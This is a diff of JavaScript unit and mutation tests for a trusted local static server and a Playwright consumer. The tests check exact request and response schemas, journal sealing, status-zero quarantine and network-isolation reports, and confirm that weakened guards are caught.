+test("F2-GOV-09-F18-A-F4 mutation controls keep pre-egress quarantine disjoint and exact", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const assertGuards = (source) => {
+    assert.match(source, /records\.length !== 0\) continue/);
+    assert.match(source, /assert\.equal\(responses\.length, 0/);
+    assert.match(source, /assert\.equal\(producerClosed, true/);
+    assert.match(source, /assert\.ok\(failures\.length <= 1/);
+    assert.match(source, /assert\.ok\(TRUSTED_LOCAL_CANCELLATION_REASONS\.has\(failure\.reason\), `\$\{engine\}: pre-egress cancellation reason is not authorized`\)/);
+    assert.match(source, /reconcileTrustedPreEgressCancellations\(\{ engine, localRequests, localResponses, localFailures, journal: browserJournal, producerClosed: true \}\)/);
+    assert.match(source, /await drainTrustedPage\(page\);\s*await page\.close\(\);\s*await context\.close\(\);\s*measuredContextClosed = true;\s*await networkPolicy\.finalizeLocalFailureCorrelations\(\);/);
+  };
+  assert.doesNotThrow(() => assertGuards(consumer));
+  for (const [label, pattern, replacement] of [
+    ["accept a server-observed request", "records.length !== 0) continue", "false) continue"],
+    ["accept a response", "assert.equal(responses.length, 0", "assert.equal(responses.length >= 0, true"],
+    ["reconcile before producer closure", "assert.equal(producerClosed, true", "assert.ok(producerClosed !== undefined"],
+    ["accept unknown cancellation", 'assert.ok(TRUSTED_LOCAL_CANCELLATION_REASONS.has(failure.reason), `${engine}: pre-egress cancellation reason is not authorized`)', 'assert.ok(true, `${engine}: pre-egress cancellation reason is not authorized`)'],
+    ["seal before producer closure", /await context\.close\(\);\r?\n    measuredContextClosed = true;\r?\n    await networkPolicy\.finalizeLocalFailureCorrelations\(\);/, "await networkPolicy.finalizeLocalFailureCorrelations();\n    await context.close();\n    measuredContextClosed = true;"],
+  ]) {
+    const mutated = consumer.replace(pattern, replacement);
+    assert.notEqual(mutated, consumer, `${label} mutation did not alter bytes`);
+    assert.throws(() => assertGuards(mutated), /input did not match|match the regular expression|both cancellation-reason boundaries/i, `${label} mutation escaped`);
+  }
+});
+
+test("F2-GOV-09-F18-A-F2 mutation controls keep journal type, response authority and operational wiring load-bearing", async () => {
+  const source = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const server = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer);
+  const mutations = [
+    ["remove journal resource binding", "assert.equal(record.resourceType, observation.resourceType, `${engine}: quarantined status-zero journal resourceType is divergent`);", "void record;", "journal-type"],
+    ["remove status-zero schema guard", "exactKeys(observation, [\"universe\", \"identityOwner\", \"requestId\", \"journalId\", \"rejectionId\", \"url\", \"route\", \"range\", \"status\", \"resourceType\"], `${engine}: quarantined status-zero observation`);", "", "observation-schema"],
+    ["remove status-zero universe guard", "assert.equal(observation.universe, \"SERVER_INTERNAL\", `${engine}: quarantined status-zero observation universe is divergent`);", "", "observation-universe"],
+    ["remove status-zero ownership guard", "assert.equal(observation.identityOwner, \"server\", `${engine}: quarantined status-zero observation ownership is divergent`);", "", "observation-owner"],
+    ["remove status-zero rejection guard", "assert.equal(observation.rejectionId, undefined, `${engine}: quarantined status zero must not claim a rejection identity`);", "", "observation-rejection"],
+    ["remove response schema guard", "recordTrustedResponseObservation(canonicalResponses, response, engine);", "", "response-schema"],
+    ["remove journal-bound response authority guards", /\s+assert\.equal\(response\.universe, record\.universe, `\$\{engine\}: conclusive response universe is divergent from the journal`\);\r?\n\s+assert\.equal\(response\.identityOwner, record\.identityOwner, `\$\{engine\}: conclusive response ownership is divergent from the journal`\);/, "", "response-authority"],
+    ["drop real conclusive responses", "responses: [...internalObservations, ...browserResponses] });", "responses: [] });", "operational-wiring"],
+  ];
+  for (const [label, pattern, replacement, kind] of mutations) {
+    const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-status-zero-operational-mutation-"));
+    try {
+      const mutated = source.replace(pattern, replacement);
+      assert.notEqual(mutated, source, `${label} mutation was a no-op`);
+      await writeFile(join(directory, "f2-gov-08-consumer.mjs"), mutated);
+      await writeFile(join(directory, "f2-gov-08-static-server.mjs"), server);
+      const module = await import(`${pathToFileURL(join(directory, "f2-gov-08-consumer.mjs")).href}?mutation=${Date.now()}-${encodeURIComponent(label)}`);
+      const url = "http://127.0.0.1:4173/media/fixture.webm";
+      const route = "media/fixture.webm";
+      const range = "bytes=0-1";
+      const first = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: "5".repeat(64), journalId: "6".repeat(64), absoluteUrl: url, route, range, rangeStart: 0, rangeEnd: 1, totalBytes: 2, bytes: 2, status: 206, finished: true };
+      const second = { ...first, requestId: "7".repeat(64), journalId: "8".repeat(64) };
+      const observation = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: null, journalId: null, rejectionId: undefined, url, route, range, status: 0, resourceType: "media" };
+      const conclusive = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: first.requestId, journalId: first.journalId, rejectionId: undefined, url, route, range, status: 206, resourceType: "media" };
+      if (kind === "journal-type") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [{ ...observation, resourceType: "document" }], journal: [first], internalObservations: [] }), `${label} must let the transplant escape`);
+      } else if (kind === "observation-schema") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [{ ...observation, attackerField: true }], journal: [first], internalObservations: [] }), `${label} must let an extra observation field escape`);
+      } else if (kind === "observation-universe") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [{ ...observation, universe: "BROWSER_CORRELATED" }], journal: [first], internalObservations: [] }), `${label} must let a transplanted observation universe escape`);
+      } else if (kind === "observation-owner") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [{ ...observation, identityOwner: "attacker" }], journal: [first], internalObservations: [] }), `${label} must let transplanted observation ownership escape`);
+      } else if (kind === "observation-rejection") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [{ ...observation, rejectionId: "f".repeat(64) }], journal: [first], internalObservations: [] }), `${label} must let a claimed rejection identity escape`);
+      } else if (kind === "response-schema") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [observation], journal: [first], internalObservations: [{ ...conclusive, attackerField: true }] }), `${label} must let a noncanonical response schema escape`);
+      } else if (kind === "response-authority") {
+        assert.doesNotThrow(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [observation], journal: [first], internalObservations: [{ ...conclusive, universe: "BROWSER_CORRELATED", identityOwner: "consumer" }] }), `${label} must let noncanonical response authority escape`);
+      } else {
+        assert.throws(() => module.reconcileOperationalStatusZero({ engine: "webkit", internalRequests: [], observations: [observation], journal: [first, second], internalObservations: [conclusive] }), /cardinality.*ambiguous/i, `${label} must reopen the operational cardinality failure`);
+      }
+    } finally { await rm(directory, { recursive: true, force: true }); }
+  }
+});
+
+test("F2-GOV-09-F17 records one server-owned request across indeterminate and conclusive observations", () => {
+  assert.equal(typeof trustedConsumer.recordServerOwnedRequest, "function");
+  const requests = [];
+  const request = {
+    universe: "SERVER_INTERNAL",
+    identityOwner: "server",
+    requestId: "e".repeat(64),
+    url: "http://127.0.0.1:4173/media/fixture.webm",
+    route: "media/fixture.webm",
+    range: "bytes=0-1",
+    resourceType: "media",
+    phase: "server-internal",
+    action: "browser-internal-request",
+  };
+  trustedConsumer.recordServerOwnedRequest(requests, request, "webkit");
+  trustedConsumer.recordServerOwnedRequest(requests, { ...request }, "webkit");
+  assert.deepEqual(requests, [request], "status-zero plus conclusive events must retain exactly one server-owned request identity");
+  assert.throws(
+    () => trustedConsumer.recordServerOwnedRequest(requests, { ...request, url: "http://127.0.0.1:4173/media/transplanted.webm" }, "webkit"),
+    /URL.*divergent|identity.*transplanted/i,
+    "a duplicate identity transplanted to another URL must fail closed",
+  );
+  assert.throws(
+    () => trustedConsumer.recordServerOwnedRequest(requests, { ...request, range: "bytes=2-3" }, "webkit"),
+    /range.*divergent|identity.*transplanted/i,
+    "a duplicate identity transplanted to another range must fail closed",
+  );
+  for (const [field, value] of [
+    ["universe", "BROWSER_CORRELATED"],
+    ["identityOwner", "consumer"],
+    ["resourceType", "document"],
+    ["phase", "control-probe"],
+    ["action", "transplanted"],
+  ]) assert.throws(
+    () => trustedConsumer.recordServerOwnedRequest(requests, { ...request, [field]: value }, "webkit"),
+    new RegExp(`${field}.*divergent|schema|ownership|universe`, "i"),
+    `a duplicate server-owned identity with divergent ${field} must fail closed`,
+  );
+  assert.throws(
+    () => trustedConsumer.recordServerOwnedRequest(requests, { ...request, unexpectedBinding: "attacker-controlled" }, "webkit"),
+    /schema is not exact/i,
+    "a server-owned request with an undeclared field must fail closed",
+  );
+});
+
+test("F2-GOV-09-F18-A mutation controls keep the exact server-owned request schema load-bearing", async () => {
+  const source = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const server = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer);
+  const request = {
+    universe: "SERVER_INTERNAL",
+    identityOwner: "server",
+    requestId: "f".repeat(64),
+    url: "http://127.0.0.1:4173/media/fixture.webm",
+    route: "media/fixture.webm",
+    range: "bytes=0-1",
+    resourceType: "media",
+    phase: "server-internal",
+    action: "browser-internal-request",
+  };
+  const mutations = [
+    ["remove exact schema", /  exactKeys\(request, \["universe"[^\n]+\n/, ""],
+    ["omit resourceType duplicate comparison", 'for (const field of ["universe", "identityOwner", "url", "route", "range", "resourceType", "phase", "action"]) {', 'for (const field of ["universe", "identityOwner", "url", "route", "range", "phase", "action"]) {'],
+  ];
+  for (const [label, pattern, replacement] of mutations) {
+    const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-request-mutation-"));
+    try {
+      const mutated = source.replace(pattern, replacement);
+      assert.notEqual(mutated, source, `${label} mutation was a no-op`);
+      await writeFile(join(directory, "f2-gov-08-consumer.mjs"), mutated);
+      await writeFile(join(directory, "f2-gov-08-static-server.mjs"), server);
+      const module = await import(`${pathToFileURL(join(directory, "f2-gov-08-consumer.mjs")).href}?mutation=${Date.now()}-${encodeURIComponent(label)}`);
+      const records = [];
+      module.recordServerOwnedRequest(records, request, "webkit");
+      assert.doesNotThrow(
+        () => module.recordServerOwnedRequest(records, label === "remove exact schema" ? { ...request, unexpectedBinding: "accepted" } : { ...request, resourceType: "document" }, "webkit"),
+        `${label} must demonstrably let the corresponding negative escape`,
+      );
+    } finally { await rm(directory, { recursive: true, force: true }); }
+  }
+});
+
+test("F2-GOV-09-F13 mutation controls keep server authority and refusal identity load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const staticServer = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+  const assertConsumerGuards = (source) => {
+    assert.match(source, /response\.status === 0/);
+    assert.match(source, /trusted local response status 0 is invalid/);
+    assert.match(source, /const requestId = record\.requestId;/);
+    assert.match(source, /trustedResponseByRequest\.has\(request\.requestId\)/);
+    assert.match(source, /rejection\.status, 403/);
+    assert.match(source, /refusalObservationByRejection\.get\(rejection\.rejectionId\)/);
+    assert.match(source, /journalRejections: sealedSnapshot\.rejections/);
+    assert.match(source, /await context\.addCookies\(\[journalWindow\.continuationCookie\]\);/);
+    assert.match(source, /Execution context was destroyed/);
+    assert.match(source, /if \(!\/Execution context was destroyed\//);
+    assert.match(source, /quarantinedStatusZero\.push/);
+    assert.match(source, /reconcileOperationalStatusZero\(\{\r?\n\s+engine, internalRequests, observations: quarantinedStatusZero, journal: sealedSnapshot\.records, internalObservations,/);
+    assert.match(source, /conclusiveJournalIds\.has\(response\.journalId\)/);
+    assert.match(source, /journalMatches\.length, 1/);
+    assert.match(source, /uncovered\.length, 1/);
+    assert.match(source, /response\.requestId, record\.requestId/);
+    assert.match(source, /response\.status, record\.status/);
+    assert.match(source, /recordServerOwnedRequest\(internalRequests/);
+    assert.match(source, /localRequests\.find\(\(\{ requestId \}\) => requestId === request\.requestId\)/);
+    assert.match(source, /exactKeys\(request, \["universe", "identityOwner", "requestId", "url", "route", "range", "resourceType", "phase", "action"\]/);
+    assert.match(source, /for \(const field of \["universe", "identityOwner", "url", "route", "range", "resourceType", "phase", "action"\]\)/);
+    assert.match(source, /!\[200, 206, 403\]\.includes\(status\)/);
+  };
+  const assertServerGuards = (source) => {
+    assert.match(source, /rejectionId: window \? sha256/);
+    assert.match(source, /"x-branct-trusted-rejection-id": record\.rejectionId/);
+    assert.match(source, /record\.authorized !== true/);
+    assert.match(source, /continuationCookie = Object\.freeze/);
+    assert.match(source, /get continuationCookie\(\)/);
+    const lateGuard = source.indexOf('if (window && ["SEALED", "VERIFIED", "REJECTED"].includes(window.state))');
+    const routeValidation = source.indexOf("validateTrustedStaticRequest(absolute, origin, expectedFiles)");
+    assert.ok(lateGuard >= 0 && routeValidation >= 0 && lateGuard < routeValidation, "late-request guard must precede route classification");
+  };
+  assert.doesNotThrow(() => assertConsumerGuards(consumer));
+  assert.doesNotThrow(() => assertServerGuards(staticServer));
+  for (const pattern of [
+    "response.status === 0",
+    "trusted local response status 0 is invalid",
+    "const requestId = record.requestId;",
+    "trustedResponseByRequest.has(request.requestId)",
+    "rejection.status, 403",
+    "refusalObservationByRejection.get(rejection.rejectionId)",
+    "journalRejections: sealedSnapshot.rejections",
+    "await context.addCookies([journalWindow.continuationCookie]);",
+    "Execution context was destroyed",
+    "quarantinedStatusZero.push",
+    "engine, internalRequests, observations: quarantinedStatusZero, journal: sealedSnapshot.records, internalObservations,",
+    "conclusiveJournalIds.has(response.journalId)",
+    "journalMatches.length, 1",
+    "uncovered.length, 1",
+    "response.requestId, record.requestId",
+    "response.status, record.status",
+    "recordServerOwnedRequest(internalRequests",
+    "localRequests.find(({ requestId }) => requestId === request.requestId)",
+    'exactKeys(request, ["universe", "identityOwner", "requestId", "url", "route", "range", "resourceType", "phase", "action"]',
+    'for (const field of ["universe", "identityOwner", "url", "route", "range", "resourceType", "phase", "action"])',
+    "![200, 206, 403].includes(status)",
+  ]) {
+    const mutated = consumer.replaceAll(pattern, "false");
+    assert.notEqual(mutated, consumer, `consumer mutation did not alter bytes: ${pattern}`);
+    assert.throws(() => assertConsumerGuards(mutated), /input did not match/i, `consumer mutation escaped: ${pattern}`);
+  }
+  for (const pattern of [
+    "rejectionId: window ? sha256",
+    '"x-branct-trusted-rejection-id": record.rejectionId',
+    "record.authorized !== true",
+    'if (window && ["SEALED", "VERIFIED", "REJECTED"].includes(window.state))',
+    "continuationCookie = Object.freeze",
+    "get continuationCookie()",
+  ]) {
+    const mutated = staticServer.replaceAll(pattern, "false");
+    assert.notEqual(mutated, staticServer, `server mutation did not alter bytes: ${pattern}`);
+    assert.throws(() => assertServerGuards(mutated), /input did not match|late-request guard/i, `server mutation escaped: ${pattern}`);
+  }
+});
+
+test("F2-GOV-09-F12 trusted server owns journal identities and rejects post-seal records", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f12-journal-"));
+  const bytes = Buffer.from("trusted journal fixture");
+  await write(directory, "fixture.txt", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "fixture.txt", sha256: sha256ForTest(bytes) }], 0);
+  try {
+    assert.equal(typeof server.openJournalWindow, "function", "server-owned journal window is absent");
+    const window = server.openJournalWindow();
+    const refused = await fetch(`${server.origin}/fixture.txt`);
+    assert.equal(refused.status, 403, "a request without the consumer-only capability must be refused before entering the authoritative journal");
+    const response = await fetch(`${server.origin}/fixture.txt`, { headers: window.authorizeHeaders({ "x-branct-trusted-request-id": "a".repeat(64) }) });
+    assert.equal(response.status, 200);
+    const openSnapshot = window.snapshot();
+    assert.equal(openSnapshot.state, "OPEN");
+    assert.equal(openSnapshot.records.length, 1);
+    assert.equal(openSnapshot.rejections.length, 1);
+    assert.match(openSnapshot.records[0].journalId, /^[0-9a-f]{64}$/);
+    assert.equal(response.headers.get("x-branct-trusted-journal-id"), openSnapshot.records[0].journalId);
+    assert.equal(openSnapshot.records[0].windowId, openSnapshot.windowId);
+    window.beginQuiescence();
+    window.seal();
+    const late = await fetch(`${server.origin}/fixture.txt`);
+    assert.equal(late.status, 409);
+    assert.equal(window.snapshot().state, "REJECTED");
+    assert.throws(() => window.verify(), /late|rejected|sealed/i);
+  } finally {
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F12 operational finalization rejects an event immediately after verification", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f12-operational-"));
+  const bytes = Buffer.from("<!doctype html><title>trusted journal</title>");
+  await write(directory, "index.html", bytes);
+  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "index.html", sha256: sha256ForTest(bytes) }], 0);
+  const { chromium } = await import("playwright");
+  const browser = await chromium.launch({ headless: true });
+  try {
+    const context = await browser.newContext();
+    const policy = await trustedConsumer.installRuntimeNetworkPolicy(context, server, "chromium", "candidate-flow");
+    const page = await context.newPage();
+    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
+    await page.close();
+    await context.close();
+    await policy.finalizeLocalFailureCorrelations();
+    assert.equal(policy.assertStillVerified(), true);
+    const late = await fetch(`${server.origin}/index.html`);
+    assert.equal(late.status, 409);
+    assert.throws(() => policy.assertStillVerified(), /no longer verified|rejected|late/i);
+  } finally {
+    await browser.close();
+    await server.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F12 mutation controls keep quiescence, sealing, extras and bijection load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const staticServer = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+  const assertGuards = (source) => {
+    assert.match(source, /collection\.beginQuiescence\(\);/);
+    assert.match(source, /journalWindow\.beginQuiescence\(\);/);
+    assert.match(source, /stable < 4/);
+    assert.match(source, /collection\.seal\(fingerprint\);/);
+    assert.match(source, /journalWindow\.seal\(\);/);
+    assert.match(source, /boundRequestByJournal\.has\(record\.journalId\)/);
+    assert.match(source, /trustedResponseByRequest\.has\(request\.requestId\)/);
+    assert.match(source, /responseHeaders\["x-branct-trusted-journal-id"\]/);
+    assert.match(source, /responseHeaders\["x-branct-trusted-request-id"\]/);
+    assert.match(source, /journalWindow\.authorizeHeaders\(headers\)/);
+    assert.match(source, /await drainTrustedPage\(page\);/);
+    assert.match(source, /await drainTrustedPage\(probePage\);/);
+    assert.match(source, /const correlation = assertTrustedProofUniverses\(\{/);
+  };
+  assert.doesNotThrow(() => assertGuards(consumer));
+  assert.match(staticServer, /request\.headers\["x-branct-trusted-window-capability"\] === window\.capability/);
+  assert.match(staticServer, /record\.authorized !== true/);
+  assert.match(staticServer, /HttpOnly; SameSite=Strict/);
+  assert.match(staticServer, /window\.continuationCapability/);
+  assert.match(staticServer, /universe === "SERVER_INTERNAL"/);
+  for (const [label, pattern] of [
+    ["consumer quiescence", "    collection.beginQuiescence();"],
+    ["server quiescence", "    journalWindow.beginQuiescence();"],
+    ["consumer seal", "    collection.seal(fingerprint);"],
+    ["server seal", "    journalWindow.seal();"],
+    ["extra journal rejection", "boundRequestByJournal.has(record.journalId)"],
+    ["server response cardinality", "trustedResponseByRequest.has(request.requestId)"],
+    ["server-owned response binding", "responseHeaders[\"x-branct-trusted-journal-id\"]"],
+    ["server-owned request identity", "responseHeaders[\"x-branct-trusted-request-id\"]"],
+    ["consumer-only request capability", "journalWindow.authorizeHeaders(headers)"],
+    ["measured lifecycle drain", "await drainTrustedPage(page);"],
+    ["control lifecycle drain", "await drainTrustedPage(probePage);"],
+    ["closed bijection", "const correlation = assertTrustedProofUniverses({"],
+  ]) {
+    const mutated = consumer.replace(pattern, label === "extra journal rejection" ? "true" : "");
+    assert.notEqual(mutated, consumer, `${label} mutation did not alter bytes`);
+    assert.throws(() => assertGuards(mutated), /input did not match/i, `${label} mutation escaped the structural guard`);
+  }
+  for (const pattern of [
+    'request.headers["x-branct-trusted-window-capability"] === window.capability',
+    "record.authorized !== true",
+    "window.continuationCapability",
+    "HttpOnly; SameSite=Strict",
+    'universe === "SERVER_INTERNAL"',
+  ]) {
+    const mutated = staticServer.replaceAll(pattern, "false");
+    assert.notEqual(mutated, staticServer, "server capability mutation did not alter bytes");
+    assert.throws(() => {
+      assert.match(mutated, /request\.headers\["x-branct-trusted-window-capability"\] === window\.capability/);
+      assert.match(mutated, /record\.authorized !== true/);
+      assert.match(mutated, /HttpOnly; SameSite=Strict/);
+      assert.match(mutated, /window\.continuationCapability/);
+      assert.match(mutated, /universe === "SERVER_INTERNAL"/);
+    }, /input did not match/i, "server capability mutation escaped the structural guard");
+  }
+});
+
+for (const [label, mutate, expected] of [
+  ["blocked attempt treated as harmless", (report) => { report.reports[0].networkIsolation.flowAttempts.push({ mechanism: "fetch", url: "https://example.invalid", origin: "https://example.invalid", phase: "measured-flow", engine: "chromium", action: "measure-responsive", route: "index.html", viewport: "390x844", disposition: "BLOCKED_BEFORE_EGRESS" }); }, /observed external network attempt/i],
+  ["WebSocket interceptor removed", (report) => { report.reports[0].networkIsolation.controls = report.reports[0].networkIsolation.controls.filter(({ action }) => action !== "WebSocket"); }, /control vector is incomplete/i],
+  ["Service Worker interceptor removed", (report) => { report.reports[0].networkIsolation.controls = report.reports[0].networkIsolation.controls.filter(({ action }) => action !== "serviceWorker.register"); }, /control vector is incomplete/i],
+  ["HTTP control reported without observation", (report) => { report.reports[0].networkIsolation.controls.find(({ action }) => action === "fetch").observed = []; }, /control observation cardinality/i],
+  ["local i18n confinement weakened", (report) => { report.reports[0].networkIsolation.localI18nSuccessCount = 0; }, /local i18n fetch was not verified/i],
+]) test(`F2-GOV-09 mutation control rejects ${label}`, () => {
+  const fixture = canonicalOperationalFixture();
+  mutate(fixture.report);
+  assert.throws(() => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest), expected);
+});
+
+test("F2-GOV-09-F8 binds the canonical Playwright cache before loading the trusted package", () => {
+  const runtime = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.runtime).toString("utf8"));
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assertCanonicalPlaywrightCacheBinding(consumer, runtime);
+});
+
+test("F2-GOV-09-F8 rejects an absent browser cache and a divergent Playwright version", async () => {
+  assert.equal(typeof trustedConsumer.validateTrustedPlaywrightInstallation, "function", "trusted Playwright installation validator is absent");
+  const cache = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f8-cache-"));
+  try {
+    const runtime = {
+      playwright: { version: "1.62.0", engines: ["chromium", "firefox", "webkit"] },
+      container: { browsersPath: cache },
+    };
+    const executables = Object.fromEntries(runtime.playwright.engines.map((engine) => [engine, join(cache, engine, `${engine}.bin`)]));
+    for (const path of Object.values(executables)) {
+      await mkdir(dirname(path), { recursive: true });
+      await writeFile(path, "trusted-browser");
+    }
+    assert.doesNotThrow(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.62.0", executables));
+    const missingCacheRuntime = structuredClone(runtime);
+    missingCacheRuntime.container.browsersPath = join(cache, "absent");
+    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(missingCacheRuntime, "1.62.0", executables), /cache is absent/i);
+    await rm(executables.chromium);
+    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.62.0", executables), /chromium.*executable.*absent|cache.*incomplete/i);
+    await writeFile(executables.chromium, "trusted-browser");
+    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.61.1", executables), /version.*divergent/i);
+  } finally {
+    await rm(cache, { recursive: true, force: true });
+  }
+});
+
+test("F2-GOV-09-F8 mutation proves the exact cache binding is load-bearing", () => {
+  const runtime = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.runtime).toString("utf8"));
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assertCanonicalPlaywrightCacheBinding(consumer, runtime);
+  const weakened = consumer.replace("process.env.PLAYWRIGHT_BROWSERS_PATH = runtime.container.browsersPath;", "");
+  assert.notEqual(weakened, consumer, "cache-binding mutation did not alter bytes");
+  assert.throws(() => assertCanonicalPlaywrightCacheBinding(weakened, runtime), /not bound before Playwright loads/i);
+});
+
+test("F2-GOV-09-F18 records one exact browser response across duplicate WebKit events", () => {
+  assert.equal(typeof trustedConsumer.recordBrowserCorrelatedResponse, "function");
+  const responses = [];
+  const response = { universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId: "1".repeat(64), journalId: "a".repeat(64), rejectionId: undefined, url: "http://127.0.0.1:4173/index.html", route: "index.html", range: null, status: 200, resourceType: "document" };
+  trustedConsumer.recordBrowserCorrelatedResponse(responses, response, "webkit");
+  trustedConsumer.recordBrowserCorrelatedResponse(responses, { ...response }, "webkit");
+  assert.deepEqual(responses, [response], "an exact duplicate observer event must not duplicate trusted evidence");
+  for (const divergent of [
+    { journalId: "b".repeat(64) }, { rejectionId: "c".repeat(64) }, { status: 206 }, { route: "other.html" }, { identityOwner: "server" },
+  ]) assert.throws(() => trustedConsumer.recordBrowserCorrelatedResponse(responses, { ...response, ...divergent }, "webkit"), /divergent|ownership/i);
+});
+
+test("F2-GOV-09-F18 coalesces only exact server-internal response callbacks", () => {
+  assert.equal(typeof trustedConsumer.recordTrustedResponseObservation, "function");
+  const responses = [];
+  const response = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: "2".repeat(64), journalId: "b".repeat(64), rejectionId: undefined, url: "http://127.0.0.1:4173/media/fixture.webm", route: "media/fixture.webm", range: "bytes=0-", status: 206, resourceType: "media" };
+  trustedConsumer.recordTrustedResponseObservation(responses, response, "webkit");
+  trustedConsumer.recordTrustedResponseObservation(responses, { ...response }, "webkit");
+  assert.deepEqual(responses, [response], "an exact duplicate internal callback must produce one server-owned observation");
+  for (const divergent of [
+    { universe: "BROWSER_CORRELATED" },
+    { identityOwner: "consumer" },
+    { journalId: "c".repeat(64) },
+    { rejectionId: "d".repeat(64) },
+    { url: "http://127.0.0.1:4173/media/other.webm" },
+    { route: "media/other.webm" },
+    { range: "bytes=1-" },
+    { status: 403 },
+    { resourceType: "document" },
+    { unexpectedBinding: "must-not-be-ignored" },
+  ]) assert.throws(() => trustedConsumer.recordTrustedResponseObservation(responses, { ...response, ...divergent }, "webkit"), /divergent|ownership|universe|schema/i);
+});
+
+test("F2-GOV-09-F18 proves exact and disjoint browser-correlated and server-internal universes", () => {
+  assert.equal(typeof trustedConsumer.assertTrustedProofUniverses, "function", "trusted proof-universe verifier is absent");
+  const windowId = "window-f18-universes";
+  const browserRequestId = "1".repeat(64);
+  const internalRequestId = "2".repeat(64);
+  const browserJournalId = "a".repeat(64);
+  const internalJournalId = "b".repeat(64);
+  const browserUrl = "http://127.0.0.1:4173/index.html";
+  const internalUrl = "http://127.0.0.1:4173/media/fixture.webm";
+  const browserRequest = { universe: "BROWSER_CORRELATED", identityOwner: "consumer", requestId: browserRequestId, url: browserUrl, route: "index.html", range: null, resourceType: "document" };
+  const internalRequest = { universe: "SERVER_INTERNAL", identityOwner: "server", requestId: internalRequestId, url: internalUrl, route: "media/fixture.webm", range: "bytes=0-31", resourceType: "media" };
+  const browserResponse = { ...browserRequest, status: 200, journalId: browserJournalId };
+  const internalObservation = { ...internalRequest, status: 206, journalId: internalJournalId };
+  const browserRecord = { sequence: 0, windowId, universe: "BROWSER_CORRELATED", identityOwner: "consumer", journalId: browserJournalId, requestId: browserRequestId, method: "GET", absoluteUrl: browserUrl, route: "index.html", range: null, rangeStart: null, rangeEnd: null, totalBytes: 64, status: 200, bytes: 64, finished: true };
+  const internalRecord = { sequence: 1, windowId, universe: "SERVER_INTERNAL", identityOwner: "server", journalId: internalJournalId, requestId: internalRequestId, method: "GET", absoluteUrl: internalUrl, route: "media/fixture.webm", range: "bytes=0-31", rangeStart: 0, rangeEnd: 31, totalBytes: 64, status: 206, bytes: 32, finished: true };
+  const verify = (overrides = {}) => trustedConsumer.assertTrustedProofUniverses({
+    engine: "webkit",
+    windowId,
+    browserRequests: [browserRequest],
+    browserResponses: [browserResponse],
+    browserFailures: [],
+    browserJournal: [browserRecord],
+    internalRequests: [internalRequest],
+    internalObservations: [internalObservation],
+    internalJournal: [internalRecord],
+    journalRejections: [],
+    ...overrides,
+  });
+  const result = verify();
+  assert.equal(result.browserCorrelated, 1);
+  assert.equal(result.serverInternal, 1);
+  assert.equal(result.refusedInternalRequests, 0);
+  assert.throws(() => verify({ internalRequests: [{ ...internalRequest, requestId: browserRequestId }] }), /disjoint|transplant|duplicate.*universes/i);
+  assert.throws(() => verify({ internalRequests: [{ ...internalRequest, identityOwner: "consumer" }] }), /ownership|server/i);
+  assert.throws(() => verify({ internalRequests: [{ ...internalRequest, requestId: null }] }), /identity.*absent|malformed/i);
+  assert.throws(() => verify({ internalRequests: [{ ...internalRequest, requestId: "f".repeat(64) }] }), /unknown|identity|bijection|cardinality/i);
+  assert.throws(() => verify({ internalObservations: [{ ...internalObservation, journalId: browserJournalId }] }), /journal|transplant|divergent|unknown/i);
+  assert.throws(() => verify({ internalObservations: [{ ...internalObservation, status: 0, journalId: null }] }), /status 0/i);
+  assert.throws(() => verify({ internalJournal: [internalRecord, { ...internalRecord, sequence: 2, journalId: "c".repeat(64) }] }), /extra|duplicate|cardinality|bijection/i);
+  assert.throws(() => verify({ browserResponses: [browserResponse, { ...internalObservation, universe: "BROWSER_CORRELATED", identityOwner: "consumer" }] }), /disjoint|promotion|unknown|cardinality/i);
+});
+
